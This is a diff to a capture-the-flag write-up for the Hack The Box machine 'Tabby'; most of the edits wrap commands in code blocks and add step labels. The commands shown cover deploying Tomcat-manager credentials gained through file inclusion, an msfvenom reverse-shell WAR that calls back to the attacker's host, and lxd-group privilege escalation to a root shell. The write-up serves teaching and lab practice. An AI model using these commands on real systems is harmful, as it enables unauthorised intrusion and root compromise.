@@ -4,7 +4,7 @@
 **Machine name:** Tabby  
 **IP:** 10.10.10.194  
 **Written by:** Adir Biran  
-**Tools:** Nmap, Gobuster, msfvenom, zip2john, john, lxd  
+**Tools and Techniques:** Nmap, Gobuster, msfvenom, zip2john, john, lxd, Local File Inclusion  
 **Method:** Enumerating the various services on the machine and gaining credentials with LFI attack.  
 Escalating the privileges once by password cracking a protected zip file and second time by exploiting lxd group.  
 
@@ -123,10 +123,14 @@ As we saw earlier, the users file is supposed to be located at /etc/tomcat9/tomc
 
 However, seems the file has been moved.  
 After failed trials, installed the tomcat9 locally using:  
+```
 sudo apt-get install tomcat9  
+```
 
 And located the tomcat-users.xml file:  
+```
 find / -name tomcat-users.xml 2>/dev/null  
+```
 <p align="center">
 <img width="190" alt="10" src="https://user-images.githubusercontent.com/21021400/144756234-17323cbb-b47e-47a8-ad5e-c6bc1749c879.png">
 </p>
@@ -166,7 +170,9 @@ https://tomcat.apache.org/tomcat-8.5-doc/host-manager-howto.html
 
 All we need is curl the url: http://10.10.10.194:8080/host-manager/text/{command} with the username and password as mentioned in the documentation.  
 Trying the basic list command from the documentation:  
+```
 curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/text/list  
+```
 <p align="center">
 <img width="367" alt="14" src="https://user-images.githubusercontent.com/21021400/144756238-374c2fac-5d5b-4f50-b9ba-d09f556e1f79.png">
 </p>
@@ -180,7 +186,9 @@ Good.
 The next thing is to upload a reverse shell using the command line.  
 
 First, let's create the payload as a war file to be deployed by the apache server.  
+```
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war -o shell.war  
+```
 <p align="center">
 <img width="352" alt="16" src="https://user-images.githubusercontent.com/21021400/144756240-3ef4913a-f59c-4235-a17a-22ae10867480.png">
 </p>
@@ -192,7 +200,9 @@ https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html#Deploy_A_New_Applica
 </p>
 
 Deploying the war remotely:  
+```
 curl -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell  
+```
 <p align="center">
 <img width="444" alt="18" src="https://user-images.githubusercontent.com/21021400/144756242-6200c61c-2bc4-4ae6-8244-17d5ff2aa887.png">
 </p>
@@ -268,13 +278,17 @@ Following the method mentioned in this article:
 https://www.hackingarticles.in/lxd-privilege-escalation/  
 
 On the local machine:
+```
 git clone  https://github.com/saghul/lxd-alpine-builder.git  
+```
 <p align="center">
 <img width="264" alt="29" src="https://user-images.githubusercontent.com/21021400/144756254-ddfa9efa-eecf-4c08-8c88-1890c6d2366d.png">
 </p>
 
+```
 cd lxd-alpine-builder  
 ./build-alpine  
+```
 
 <p align="center">
 <img width="183" alt="30" src="https://user-images.githubusercontent.com/21021400/144756256-39066620-706a-425e-ac0a-420a34a3db3a.png">
@@ -297,45 +311,66 @@ So we will move the alpine.tar.gz file to the /home/ash directory and continue t
 </p>
 
 First, initiate the lxd service:  
+```
 lxd init  
+```
 <p align="center">
 <img width="411" alt="34" src="https://user-images.githubusercontent.com/21021400/144756260-7c2c9acb-953c-4775-96f5-9e6d96994684.png">
 </p>
 
 As we can see, lxd wasn't found because /snap/bin isn't in our path, let's add it.  
+```
 export PATH=/snap/bin:$PATH  
-lxd init (again)  
+lxd init  
+```
 <p align="center">
 <img width="426" alt="35" src="https://user-images.githubusercontent.com/21021400/144756261-4aa1719a-90a7-4236-8c42-7d13eeadc265.png">
 </p>
 
+Import the image  
+```
 lxc image import ./alpine.tar.gz --alias img  
+```
 <p align="center">
 <img width="249" alt="36" src="https://user-images.githubusercontent.com/21021400/144756262-65773314-7d05-497b-9204-3128ba829713.png">
 </p>
 
 Make sure the image was imported  
+```
 lxc image list  
+```
 <p align="center">
 <img width="531" alt="37" src="https://user-images.githubusercontent.com/21021400/144756264-559d7f55-aaa1-40e2-a2dd-2bbfcd931dd6.png">
 </p>
 
+Set security privileges  
+```
 lxc init img ignite -c security.privileged=true  
+```
 <p align="center">
 <img width="246" alt="38" src="https://user-images.githubusercontent.com/21021400/144756267-7abe330d-b32f-46cd-9a0b-a1e178be1f10.png">
 </p>
 
+Mount the image  
+```
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
+```
 <p align="center">
 <img width="382" alt="39" src="https://user-images.githubusercontent.com/21021400/144756268-07fe8dc1-a2d0-4311-8243-4a639d59ad90.png">
 </p>
 
+Start the image  
+```
 lxc start ignite  
+```
 <p align="center">
 <img width="129" alt="40" src="https://user-images.githubusercontent.com/21021400/144756270-aa9e0138-c42e-4ca2-9b93-361400b93c4d.png">
 </p>
 
+Execute root shell  
+```
 lxc exec ignite /bin/sh  
+```
 <p align="center">
 <img width="150" alt="41" src="https://user-images.githubusercontent.com/21021400/144756271-5b0d8aa2-f986-42c7-a2fe-f31b946e8b58.png">
 </p>
